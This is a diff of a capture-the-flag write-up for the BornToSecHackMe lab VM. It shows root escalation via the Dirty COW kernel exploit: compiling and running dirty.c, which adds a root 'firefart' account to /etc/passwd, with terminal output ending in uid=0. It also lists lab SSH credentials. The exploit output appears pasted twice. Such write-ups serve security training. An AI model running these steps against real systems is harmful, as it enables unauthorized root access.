@@ -5,15 +5,14 @@ When we search a way to get root on syslinux for writeup2, we found an other way
 
 This vulnerability is fixed on kernel version 4.8 and superior, so we need to know our version of kernel, and be connected:
 
-ssh user: `thor`  
-ssh password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+ssh user: `laurie`  
+ssh password: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
 
 ```bash
-ssh thor@{IP}
+ssh laurie@{IP}
 
-> uname -a
+laurie@BornToSecHackMe:~$ uname -a
 Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
-
 ```
 
 We are now sure that dirtycow is possible, the version is bellow 4.8.
@@ -22,21 +21,32 @@ After some tests, we found this script of dirty cow who works on our vm : [dirty
 
 This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line in /etc/passwd.
 
-We create a file dirty.c with this script, then run with the command given by the creator of the script:
+We create a file `dirty.c` with this script, then run with the command given by the creator of the script:
 
 ```bash
-> gcc -pthread dirty.c -o dirty -lcrypt
-> ./dirty
+laurie@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
+laurie@BornToSecHackMe:~$ ./dirty
 /etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password: test
+Please enter the new password:
+Complete line:
+firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash
 
-> su firefart
-Password: test
-```
+mmap: b7fda000
+madvise 0
 
-After this, we need to restore `/etc/passwd` with `mv /tmp/passwd.bak /etc/passwd`.
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'test'.
 
-```bash
-> whoami
-root
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'test'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+laurie@BornToSecHackMe:~$ su firefart
+Password:
+firefart@BornToSecHackMe:/home/laurie# id
+uid=0(firefart) gid=0(root) groups=0(root)
 ```
